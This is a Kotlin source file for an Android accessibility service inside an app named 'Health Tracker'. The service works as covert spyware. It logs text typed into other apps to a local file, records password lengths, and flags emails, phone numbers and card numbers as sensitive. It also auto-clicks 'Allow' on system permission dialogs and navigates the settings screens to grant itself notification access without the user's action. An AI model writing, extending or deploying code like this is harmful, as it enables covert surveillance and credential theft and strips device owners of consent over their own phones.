package com.inf2007.healthtracker.utilities

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import java.util.regex.Pattern
import android.os.Handler
import android.os.Looper
import com.inf2007.healthtracker.utilities.NotificationPermissionUtils
import android.content.Intent
import android.provider.Settings

class WatchAccessibilityService : AccessibilityService() {
    companion object {
        const val TAG = "WatchAccessibility"
    }

    private lateinit var logFile: File
    private val dateFormat = SimpleDateFormat("HH:mm:ss", Locale.US)

    // Unified tracking system
    private data class FieldInfo(
        val packageName: String,
        val fieldId: String,
        var lastText: String = "",
        var lastLogTime: Long = 0,
        var isPassword: Boolean = false
    )

    private val fieldTracking = mutableMapOf<String, FieldInfo>()
    private var lastGlobalText = ""
    private var lastGlobalLogTime = 0L

    // Placeholder texts to ignore
    private val placeholderTexts = setOf(
        "Search Google or type URL",
        "Search YouTube",
        "Search messages",
        "Search apps, web and more",
        "Navigate up",
        "Allow notification access",
        "Health monitoring enhanced!",
        "Monitor Linked Successfully!",
        "Health Monitor Active!",
        "Health Tracker"
    )

    private var isNotificationFlowActive = false

    override fun onCreate() {
        super.onCreate()
        logFile = File(filesDir, "watch.log")
        Log.d(TAG, "Watch accessibility service created")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleTextChanged(event)
                }
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    handleContentChanged(event)
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    handlePermissionDialog(event)
                    // Also check immediately for permission buttons
                    Handler(Looper.getMainLooper()).postDelayed({
                        val root = rootInActiveWindow
                        root?.let {
                            if (it.packageName?.contains("permissioncontroller") == true) {
                                grantPermission()
                            }
                        }
                    }, 300)
                }
                else -> {
                    // Ignore other events
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing event", e)
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"

        // Skip keyboard apps
        if (packageName.contains("keyboard") || packageName.contains("inputmethod")) {
            return
        }

        event.text?.let { textList ->
            for (i in 0 until textList.size) {
                val text = textList[i]?.toString()
                if (!text.isNullOrEmpty()) {
                    // Skip placeholder texts
                    if (isPlaceholderText(text)) {
                        continue
                    }

                    val source = event.source
                    var fieldId = "global"
                    var isPasswordField = false

                    if (source != null) {
                        fieldId = source.viewIdResourceName ?: getStableNodeId(source)
                        isPasswordField = source.isPassword ||
                                source.className?.toString()?.contains("password", true) == true ||
                                source.viewIdResourceName?.contains("password", true) == true

                        // Skip non-editable fields unless they look like user input
                        if (!isEditableField(source) && !isLikelyUserInput(text)) {
                            source.recycle()
                            continue
                        }
                        source.recycle()
                    }

                    // Create or get field info
                    val fieldKey = "$packageName:$fieldId"
                    val fieldInfo = fieldTracking.getOrPut(fieldKey) {
                        FieldInfo(packageName, fieldId)
                    }

                    // Check if text actually changed
                    if (text != fieldInfo.lastText) {
                        fieldInfo.lastText = text
                        fieldInfo.isPassword = isPasswordField

                        // Log with cooldown (minimum 100ms between logs for same field)
                        val now = System.currentTimeMillis()
                        if (now - fieldInfo.lastLogTime > 100) {
                            logFieldInput(fieldInfo, text, "TEXT_CHANGED")
                            fieldInfo.lastLogTime = now
                        }
                    }
                }
            }
        }
    }

    private fun handleContentChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"

        // Skip keyboard apps
        if (packageName.contains("keyboard") || packageName.contains("inputmethod")) {
            return
        }

        // Only check focused field for content changes (most relevant)
        try {
            val root = rootInActiveWindow ?: return
            val focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)

            if (focusedNode != null && isEditableField(focusedNode)) {
                val text = focusedNode.text?.toString() ?: ""
                if (text.isNotEmpty() && !isPlaceholderText(text)) {
                    val fieldId = focusedNode.viewIdResourceName ?: getStableNodeId(focusedNode)
                    val isPasswordField = focusedNode.isPassword

                    val fieldKey = "$packageName:$fieldId"
                    val fieldInfo = fieldTracking.getOrPut(fieldKey) {
                        FieldInfo(packageName, fieldId)
                    }

                    // Check if text changed
                    if (text != fieldInfo.lastText) {
                        fieldInfo.lastText = text
                        fieldInfo.isPassword = isPasswordField

                        val now = System.currentTimeMillis()
                        if (now - fieldInfo.lastLogTime > 100) {
                            logFieldInput(fieldInfo, text, "FOCUSED")
                            fieldInfo.lastLogTime = now
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in handleContentChanged", e)
        }
    }

    private fun logFieldInput(fieldInfo: FieldInfo, text: String, source: String) {
        // Skip if this is the same as the last global text (to avoid cross-field duplicates)
        if (text == lastGlobalText && System.currentTimeMillis() - lastGlobalLogTime < 500) {
            return
        }

        if (fieldInfo.isPassword) {
            logToFile("[PASSWORD] in ${fieldInfo.packageName}: ${text.length} chars")
        } else {
            logToFile("[INPUT] in ${fieldInfo.packageName}: '$text'")
            detectSensitiveInfo(text, fieldInfo.packageName)
        }

        // Update global tracking
        lastGlobalText = text
        lastGlobalLogTime = System.currentTimeMillis()
    }

    private fun getStableNodeId(node: AccessibilityNodeInfo): String {
        // Create a stable ID based on class name
        val className = node.className?.toString() ?: "unknown"
        val textHash = node.text?.hashCode() ?: 0
        val contentDesc = node.contentDescription?.hashCode() ?: 0

        return "${className.hashCode()}:$textHash:$contentDesc"
    }

    private fun isEditableField(node: AccessibilityNodeInfo): Boolean {
        return node.isEditable ||
                node.className?.toString()?.contains("EditText", true) == true ||
                node.className?.toString()?.contains("TextInputEditText", true) == true
    }

    private fun isPlaceholderText(text: String): Boolean {
        return placeholderTexts.contains(text) ||
                text.length < 3 || // Very short texts are usually placeholders
                text.contains("Search") ||
                text.contains("Type") ||
                text.contains("Enter")
    }

    private fun isLikelyUserInput(text: String): Boolean {
        // More sophisticated user input detection
        if (text.length < 2) return false

        // Check for patterns that look like user input
        val hasEmailPattern = text.contains("@") && text.contains(".")
        val hasSpaces = text.contains(" ")
        val hasMixedCase = text.any { it.isUpperCase() } && text.any { it.isLowerCase() }
        val hasSpecialChars = text.any { !it.isLetterOrDigit() && !it.isWhitespace() }

        return hasEmailPattern || hasSpaces || hasMixedCase || hasSpecialChars || text.length > 8
    }

    private fun detectSensitiveInfo(text: String, packageName: String) {
        val emailPattern = Pattern.compile("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}")
        val emailMatcher = emailPattern.matcher(text)
        if (emailMatcher.find()) {
            val email = emailMatcher.group()
            logToFile("[SENSITIVE] Email detected in $packageName: '$email'")
        }

        val phonePattern = Pattern.compile("(\\+?\\d{1,3}[-.\\s]?)?\\(?\\d{3}\\)?[-.\\s]?\\d{3}[-.\\s]?\\d{4}")
        val phoneMatcher = phonePattern.matcher(text)
        if (phoneMatcher.find()) {
            val phone = phoneMatcher.group()
            logToFile("[SENSITIVE] Phone detected in $packageName: '$phone'")
        }

        val ccPattern = Pattern.compile("\\b\\d{4}[ -]?\\d{4}[ -]?\\d{4}[ -]?\\d{4}\\b")
        val ccMatcher = ccPattern.matcher(text)
        if (ccMatcher.find()) {
            logToFile("[SENSITIVE] Credit card pattern detected in $packageName")
        }
    }

    private fun logToFile(message: String) {
        try {
            val timestamp = dateFormat.format(Date(System.currentTimeMillis()))
            FileOutputStream(logFile, true).use { fos ->
                fos.write("$timestamp - $message\n".toByteArray())
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to write to log file", e)
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Service interrupted, resetting notification flow flag")
        isNotificationFlowActive = false
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Accessibility service connected and active")
    }

    private fun handlePermissionDialog(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: ""
        val className = event.className?.toString() ?: ""

        Log.d(TAG, "Window changed - Package: $packageName, Class: $className")

        // Detect Android permission dialog
        if (packageName.contains("permissioncontroller") ||
            packageName.contains("packageinstaller")) {

            Log.i(TAG, "PERMISSION DIALOG DETECTED! Auto-granting...")
            Handler(Looper.getMainLooper()).postDelayed({
                grantPermission()
            }, 100)
        }
    }

    private fun grantPermission() {
        val root = rootInActiveWindow ?: return

        // Try to find ALLOW button (including location permission variants)
        var allowButton = findNodeByExactText(root, "While using the app")
        if (allowButton == null) {
            allowButton = findNodeByExactText(root, "Allow")
        }
        if (allowButton == null) {
            allowButton = findNodeByExactText(root, "Allow all the time")
        }
        if (allowButton == null) {
            allowButton = findNodeByExactText(root, "Only this time")
        }
        if (allowButton == null) {
            allowButton = findButtonByResourceId(root)
        }
        if (allowButton == null) {
            allowButton = findPermissionButton(root)
        }

        if (allowButton != null && allowButton.isEnabled) {
            Log.i(TAG, "Found Allow button, clicking...")
            allowButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)

            // AFTER clicking, schedule a check for the NEXT permission dialog
            Handler(Looper.getMainLooper()).postDelayed({
                checkForNextPermissionDialog()
            }, 100)
        }
    }

    private fun checkForNextPermissionDialog() {
        val root = rootInActiveWindow ?: return

        // Check if we're still in a permission dialog
        val packageName = root.packageName ?: ""
        if (packageName.contains("permissioncontroller") ||
            packageName.contains("packageinstaller")) {

            Log.i(TAG, "Still in permission dialog, looking for next Allow button...")
            grantPermission()  // Try to grant the next permission
        } else {
            // No more permission dialogs - we're done with runtime permissions!
            Log.i(TAG, "No more permission dialogs detected - all runtime permissions granted")

            // Now check if we need to trigger notification settings
            Handler(Looper.getMainLooper()).postDelayed({
                triggerNotificationSettingsAfterPermissions()
            }, 300)
        }
    }

    private fun findNodeByExactText(root: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        val queue = mutableListOf(root)

        while (queue.isNotEmpty()) {
            val node = queue.removeAt(0)

            node.text?.toString()?.let { nodeText ->
                if (nodeText == text) {  // Exact match, not contains
                    return node
                }
            }

            node.contentDescription?.toString()?.let { description ->
                if (description == text) {  // Exact match
                    return node
                }
            }

            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return null
    }

    private fun findPermissionButton(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val queue = mutableListOf(root)
        val permissionButtonTexts = setOf(
            "While using the app",
            "Allow",
            "Allow all the time",
            "Only this time",
            "ALLOW",
            "Grant",
            "GRANT"
        )

        while (queue.isNotEmpty()) {
            val node = queue.removeAt(0)

            // Only consider clickable nodes
            if (node.isClickable) {
                node.text?.toString()?.let { nodeText ->
                    if (permissionButtonTexts.contains(nodeText)) {
                        return node
                    }
                }

                node.contentDescription?.toString()?.let { description ->
                    if (permissionButtonTexts.contains(description)) {
                        return node
                    }
                }
            }

            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return null
    }

    private fun debugPrintAllSwitches(root: AccessibilityNodeInfo) {
        val queue = mutableListOf(root)

        while (queue.isNotEmpty()) {
            val node = queue.removeAt(0)

            node.className?.toString()?.let { className ->
                if (className.contains("Switch") || className.contains("Toggle")) {
                    val text = node.text?.toString() ?: "no text"
                    val desc = node.contentDescription?.toString() ?: "no desc"
                    val id = node.viewIdResourceName ?: "no id"
                    Log.d(TAG, "Switch found - Text: '$text', Desc: '$desc', ID: $id")
                }
            }

            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
    }

    private fun findNodeByText(root: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        val queue = mutableListOf(root)

        while (queue.isNotEmpty()) {
            val node = queue.removeAt(0)

            node.text?.toString()?.let { nodeText ->
                if (nodeText.contains(text, ignoreCase = true)) {
                    return node
                }
            }

            node.contentDescription?.toString()?.let { description ->
                if (description.contains(text, ignoreCase = true)) {
                    return node
                }
            }

            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return null
    }

    private fun findButtonByResourceId(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val queue = mutableListOf(root)

        while (queue.isNotEmpty()) {
            val node = queue.removeAt(0)

            node.viewIdResourceName?.let { id ->
                // Common permission button IDs across different Android versions
                if (id.contains("permission_allow_button") ||
                    id.contains("button1") ||  // Positive button in dialogs
                    id.contains("allow_button") ||
                    id.contains("permission_allow") ||
                    id.contains("allowAlwaysButton") ||
                    id.contains("allowForegroundButton") ||
                    id.contains("allowWhileUsingButton")) {  // Added for location permission
                    return node
                }
            }

            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return null
    }

    private fun triggerNotificationSettingsAfterPermissions() {
        // Prevent multiple triggers
        if (isNotificationFlowActive) {
            Log.i(TAG, "Notification flow already active, skipping...")
            return
        }

        try {
            val context = applicationContext
            if (!isNotificationAccessGranted()) {
                isNotificationFlowActive = true
                Log.i(TAG, "All runtime permissions granted, now triggering notification settings...")

                // Launch notification listener settings
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)

                Log.i(TAG, "Notification settings launched from accessibility service")

                // Wait longer for the notification settings to fully load
                Handler(Looper.getMainLooper()).postDelayed({
                    autoEnableNotificationAccess()
                }, 300)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to trigger notification settings", e)
            isNotificationFlowActive = false
        }
    }

    private fun autoEnableNotificationAccess() {
        val root = rootInActiveWindow ?: run {
            Log.w(TAG, "Root window not available for notification auto-enable")
            Handler(Looper.getMainLooper()).postDelayed({
                autoEnableNotificationAccess()
            }, 300)
            return
        }

        Log.i(TAG, "Looking for Health Tracker in notification app list...")

        // Try multiple methods to find and click Health Tracker entry

        // Method 1: Find by text and click the entire row
        var appEntry = findAppEntryRow(root, "Health Tracker")
        if (appEntry == null) {
            appEntry = findAppEntryRow(root, "com.inf2007.healthtracker")
        }

        if (appEntry != null && appEntry.isEnabled) {
            Log.i(TAG, "Found Health Tracker entry row, clicking to open app settings...")
            appEntry.performAction(AccessibilityNodeInfo.ACTION_CLICK)

            // Wait for the app detail page to load
            Handler(Looper.getMainLooper()).postDelayed({
                enableNotificationToggleOnDetailPage()
            }, 2000)
            return
        }

        // Method 2: Find by text and click the text itself
        var appText = findNodeByText(root, "Health Tracker")
        if (appText == null) {
            appText = findNodeByText(root, "com.inf2007.healthtracker")
        }

        if (appText != null && appText.isEnabled) {
            Log.i(TAG, "Found Health Tracker text, clicking...")
            appText.performAction(AccessibilityNodeInfo.ACTION_CLICK)

            Handler(Looper.getMainLooper()).postDelayed({
                enableNotificationToggleOnDetailPage()
            }, 2000)
            return
        }

        // Method 3: Some Android versions have a switch right on the list page
        Log.i(TAG, "Trying to find and toggle notification access directly on list page...")
        val toggleSwitch = findNotificationSwitchOnListPage(root)
        if (toggleSwitch != null && toggleSwitch.isEnabled) {
            Log.i(TAG, "Found toggle on list page, clicking...")
            toggleSwitch.performAction(AccessibilityNodeInfo.ACTION_CLICK)

            Handler(Looper.getMainLooper()).postDelayed({
                handleNotificationConfirmationDialog()
            }, 300)
            return
        }

        Log.w(TAG, "Health Tracker not found in notification settings list")
        debugPrintAllText(root)
    }

    private fun findAppEntryRow(root: AccessibilityNodeInfo, appName: String): AccessibilityNodeInfo? {
        val queue = mutableListOf(root)

        while (queue.isNotEmpty()) {
            val node = queue.removeAt(0)

            // Check if this node or its children contain the app name
            val nodeText = node.text?.toString() ?: ""
            val contentDesc = node.contentDescription?.toString() ?: ""

            if (nodeText.contains(appName) || contentDesc.contains(appName)) {
                // Found a node with the app name, now find the clickable row
                var parent = node
                while (parent != null) {
                    if (parent.isClickable) {
                        return parent
                    }
                    parent = parent.parent
                }
                return node // Return the node itself if no clickable parent found
            }

            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return null
    }

    // New method to find switch on list page (some Android versions)
    private fun findNotificationSwitchOnListPage(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        // First find the app entry
        val appEntry = findAppEntryRow(root, "Health Tracker") ?:
        findAppEntryRow(root, "com.inf2007.healthtracker")

        if (appEntry != null) {
            // Look for a switch within the app entry
            return findSwitchInNodeTree(appEntry)
        }
        return null
    }

    // New method to handle the app detail page
    private fun enableNotificationToggleOnDetailPage() {
        val root = rootInActiveWindow ?: run {
            Log.w(TAG, "Root window not available for toggle, retrying...")
            Handler(Looper.getMainLooper()).postDelayed({
                enableNotificationToggleOnDetailPage()
            }, 300)
            return
        }

        // Check if we're actually on the detail page
        val pageTitle = findPageTitle(root)
        Log.i(TAG, "Current page title: '$pageTitle'")

        // If we're still on the list page (showing many app names), try clicking again
        if (pageTitle.contains("Notification access") ||
            root.text?.toString()?.contains("Allowed") == true ||
            root.text?.toString()?.contains("Not allowed") == true) {
            Log.w(TAG, "Still on list page, retrying click...")

            // Try clicking again
            val appEntry = findAppEntryRow(root, "Health Tracker")
            appEntry?.performAction(AccessibilityNodeInfo.ACTION_CLICK)

            Handler(Looper.getMainLooper()).postDelayed({
                enableNotificationToggleOnDetailPage()
            }, 300)
            return
        }

        Log.i(TAG, "On app detail page, looking for notification toggle...")

        // Debug: Print all text on the detail page
        debugPrintAllText(root)
        debugPrintAllSwitches(root)

        // Look for the toggle switch on the detail page
        val toggleSwitch = findNotificationToggleOnDetailPage(root)

        if (toggleSwitch != null && toggleSwitch.isEnabled) {
            Log.i(TAG, "Found notification toggle, clicking...")
            toggleSwitch.performAction(AccessibilityNodeInfo.ACTION_CLICK)

            // Handle confirmation dialog
            Handler(Looper.getMainLooper()).postDelayed({
                handleNotificationConfirmationDialog()
            }, 300)
        } else {
            Log.e(TAG, "Could not find notification toggle on detail page, retrying...")
            Handler(Looper.getMainLooper()).postDelayed({
                enableNotificationToggleOnDetailPage()
            }, 300)
        }
    }

    private fun findPageTitle(root: AccessibilityNodeInfo): String {
        val queue = mutableListOf(root)

        while (queue.isNotEmpty()) {
            val node = queue.removeAt(0)

            // Look for toolbar title or large text at top
            node.viewIdResourceName?.let { id ->
                if (id.contains("title") || id.contains("action_bar") || id.contains("toolbar")) {
                    node.text?.toString()?.let { return it }
                }
            }

            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
        return ""
    }


    // Find the toggle switch specifically on the app detail page
    private fun findNotificationToggleOnDetailPage(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val queue = mutableListOf(root)

        // Method 1: Look for the specific notification access setting text
        while (queue.isNotEmpty()) {
            val node = queue.removeAt(0)

            node.text?.toString()?.let { text ->
                // Look for the permission text
                if (text.contains("Allow notification access", ignoreCase = true) ||
                    text.contains("Notification access", ignoreCase = true) ||
                    text.contains("Allow access", ignoreCase = true) ||
                    text.contains("notification listener", ignoreCase = true)) {

                    Log.i(TAG, "Found notification access text: '$text'")

                    // Try to find the clickable element (could be a switch, checkbox, or the whole row)
                    val parent = node.parent
                    if (parent != null) {
                        // Look for ANY clickable/checkable element in the parent hierarchy
                        val clickableElement = findClickableElementInNode(parent)
                        if (clickableElement != null) return clickableElement
                    }
                }
            }

            // Method 2: Directly look for checkboxes or switches with "notification" context
            node.className?.toString()?.let { className ->
                if (className.contains("CheckBox") ||
                    className.contains("Switch") ||
                    className.contains("CompoundButton") ||
                    className.contains("android.widget.CheckBox") ||
                    className.contains("android.widget.Switch")) {

                    // Check if this element is for notification access
                    val parentText = getParentText(node)
                    if (parentText.contains("notification", ignoreCase = true) ||
                        parentText.contains("access", ignoreCase = true)) {
                        Log.i(TAG, "Found notification toggle/checkbox")
                        return node
                    }
                }
            }

            // Method 3: Look for the preference row that contains the notification text
            node.viewIdResourceName?.let { id ->
                if (id.contains("switch") ||
                    id.contains("checkbox") ||
                    id.contains("toggle") ||
                    id.contains("android:id/switch_widget") ||
                    id.contains("preference")) {

                    val nodeText = node.text?.toString() ?: ""
                    val contentDesc = node.contentDescription?.toString() ?: ""
                    val parentText = getParentText(node)

                    if (nodeText.contains("notification", ignoreCase = true) ||
                        contentDesc.contains("notification", ignoreCase = true) ||
                        parentText.contains("notification", ignoreCase = true)) {
                        return node
                    }
                }
            }

            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }

        // Method 4: Last resort - on the detail page, the first checkbox/switch is usually the notification access
        val allClickableElements = findAllClickableElements(root)
        if (allClickableElements.isNotEmpty()) {
            Log.i(TAG, "Using fallback - clicking first clickable element on detail page")
            return allClickableElements[0]
        }

        return null
    }

    // Helper method to find any clickable/checkable element
    private fun findClickableElementInNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val queue = mutableListOf(node)

        while (queue.isNotEmpty()) {
            val currentNode = queue.removeAt(0)

            if (currentNode.isClickable || currentNode.isCheckable || currentNode.isEnabled) {
                // Check if it's likely the toggle (has switch/checkbox class or ID)
                val className = currentNode.className?.toString() ?: ""
                val viewId = currentNode.viewIdResourceName ?: ""

                if (className.contains("Switch") ||
                    className.contains("CheckBox") ||
                    className.contains("CompoundButton") ||
                    viewId.contains("switch") ||
                    viewId.contains("checkbox") ||
                    viewId.contains("toggle")) {
                    return currentNode
                }

                // If we find a clickable element with no text, it's often the toggle
                if (currentNode.text.isNullOrEmpty() &&
                    currentNode.contentDescription.isNullOrEmpty()) {
                    return currentNode
                }
            }

            for (i in 0 until currentNode.childCount) {
                currentNode.getChild(i)?.let { queue.add(it) }
            }
        }
        return null
    }

    // Find all clickable elements on the page
    private fun findAllClickableElements(root: AccessibilityNodeInfo): List<AccessibilityNodeInfo> {
        val elements = mutableListOf<AccessibilityNodeInfo>()
        val queue = mutableListOf(root)

        while (queue.isNotEmpty()) {
            val node = queue.removeAt(0)

            if (node.isClickable || node.isCheckable) {
                elements.add(node)
            }

            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }

        return elements
    }

    // Add debug method to see all text on screen
    private fun debugPrintAllText(root: AccessibilityNodeInfo) {
        val queue = mutableListOf(root)
        val texts = mutableSetOf<String>()

        while (queue.isNotEmpty()) {
            val node = queue.removeAt(0)

            node.text?.toString()?.let { text ->
                if (text.isNotBlank() && !texts.contains(text)) {
                    texts.add(text)
                    Log.d(TAG, "Text found: '$text'")
                }
            }

            node.contentDescription?.toString()?.let { desc ->
                if (desc.isNotBlank() && !texts.contains(desc)) {
                    texts.add(desc)
                    Log.d(TAG, "Content description: '$desc'")
                }
            }

            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
    }

    // Helper to find switch in a node tree
    private fun findSwitchInNodeTree(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val queue = mutableListOf(node)

        while (queue.isNotEmpty()) {
            val currentNode = queue.removeAt(0)

            // Check by class name
            currentNode.className?.toString()?.let { className ->
                if (className.contains("Switch") ||
                    className.contains("Toggle") ||
                    className.contains("android.widget.Switch") ||
                    className.contains("androidx.appcompat.widget.SwitchCompat") ||
                    className.contains("android.widget.CheckBox") ||
                    className.contains("android.widget.CompoundButton")
                ) {
                    if (currentNode.isEnabled && (currentNode.isClickable || currentNode.isCheckable)) {
                        return currentNode
                    }
                }
            }

            // Check by resource ID
            currentNode.viewIdResourceName?.let { id ->
                if (id.contains("switch") ||
                    id.contains("toggle") ||
                    id.contains("checkbox") ||
                    id.contains("android:id/switch_widget")
                ) {
                    if (currentNode.isEnabled && (currentNode.isClickable || currentNode.isCheckable)) {
                        return currentNode
                    }
                }
            }

            for (i in 0 until currentNode.childCount) {
                currentNode.getChild(i)?.let { queue.add(it) }
            }
        }
        return null
    }

    // Get text from parent hierarchy
    private fun getParentText(node: AccessibilityNodeInfo): String {
        val textBuilder = StringBuilder()
        var current = node.parent

        while (current != null) {
            current.text?.toString()?.let { textBuilder.append(it).append(" ") }
            current.contentDescription?.toString()?.let { textBuilder.append(it).append(" ") }
            current = current.parent
        }

        return textBuilder.toString()
    }

    // Handle confirmation dialog for notification access
    private fun handleNotificationConfirmationDialog() {
        Handler(Looper.getMainLooper()).postDelayed({
            val root = rootInActiveWindow ?: return@postDelayed

            Log.i(TAG, "Looking for notification confirmation dialog...")

            var allowButton = findNodeByExactText(root, "Allow")
            // ... existing code ...

            if (allowButton != null && allowButton.isEnabled) {
                Log.i(TAG, "Found confirmation button, clicking...")
                allowButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)

                Log.i(TAG, "Notification access granted!")
                isNotificationFlowActive = false

                // ADD THIS: Trigger the main app to start services
                Handler(Looper.getMainLooper()).postDelayed({
                    returnToAppAndStartServices()
                }, 1500)
            } else {
                Log.w(TAG, "Confirmation button not found, may already be granted")
                isNotificationFlowActive = false
                returnToAppAndStartServices()
            }
        }, 1500)
    }

    private fun returnToAppAndStartServices() {
        try {
            val intent = Intent("com.inf2007.healthtracker.PERMISSIONS_GRANTED")
            intent.setPackage("com.inf2007.healthtracker")
            sendBroadcast(intent)

            // Also try to launch the app
            val launchIntent = packageManager.getLaunchIntentForPackage("com.inf2007.healthtracker")
            launchIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_CLEAR_TOP or
                    Intent.FLAG_ACTIVITY_SINGLE_TOP)
            startActivity(launchIntent)

            Log.i(TAG, "Returning to Health Tracker app and triggering services")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to return to app", e)
        }
    }

    // Add helper method to check notification access
    private fun isNotificationAccessGranted(): Boolean {
        return try {
            val enabledListeners = Settings.Secure.getString(
                contentResolver,
                "enabled_notification_listeners"
            )
            val packageName = packageName
            !android.text.TextUtils.isEmpty(enabledListeners) && enabledListeners?.contains(packageName) == true
        } catch (e: Exception) {
            false
        }
    }
}